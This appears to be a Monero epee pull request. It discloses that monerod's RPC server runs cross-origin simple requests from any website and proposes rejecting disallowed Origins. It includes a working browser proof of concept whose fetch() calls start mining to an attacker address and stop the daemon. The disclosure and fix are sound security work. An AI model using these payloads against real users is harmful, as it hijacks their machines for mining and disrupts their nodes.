# epee: reject HTTP requests from disallowed origins
author: xmrack
created_at: 2026-08-26T16:31:54Z
status: open

The CORS logic only decided whether to add Access-Control-Allow-Origin to the response; the request itself was dispatched regardless of its Origin. Since neither the HTTP method nor the Content-Type is checked, a web page on any origin could issue a CORS simple request (POST, text/plain, no preflight) that reached an unauthenticated state-changing endpoint such as /stop_daemon or /start_mining for users who run monerod on the same computer that they use to browse the web.

Fix: Refuse to execute a request whose Origin is not in the configured --rpc-access-control-origins list. Requests without an Origin header, which covers all non-browser clients, are unaffected. Alternatively (or both?) you could enforce a JSON content type.

Run the following commands in a web browser on any origin
```
fetch("http://127.0.0.1:18081/get_info", {
  method: "POST", mode: "no-cors",
  headers: { "Content-Type": "text/plain;charset=UTF-8" },
  body: "{}"
});

// bump the daemon's log level
fetch("http://127.0.0.1:18081/set_log_level", {
  method: "POST", mode: "no-cors",
  headers: { "Content-Type": "text/plain;charset=UTF-8" },
  body: JSON.stringify({ level: 2 })
});

// point mining at an attacker-chosen address
fetch("http://127.0.0.1:18081/start_mining", {
  method: "POST", mode: "no-cors",
  headers: { "Content-Type": "text/plain;charset=UTF-8" },
  body: JSON.stringify({
    miner_address: "42ey1afDFnn4886T7196doS9GPMzexD9gXpsZJDwVjeRVdFCSoHnv7KPbBeGpzJBzHRCAs9UxqeoyFQMYbqSWYTfJJQAWDm",
    threads_count: 1, do_background_mining: false, ignore_battery: true
  })
});

// shut the daemon down
fetch("http://127.0.0.1:18081/stop_daemon", {
  method: "POST", mode: "no-cors",
  headers: { "Content-Type": "text/plain;charset=UTF-8" },
  body: "{}"
});
```
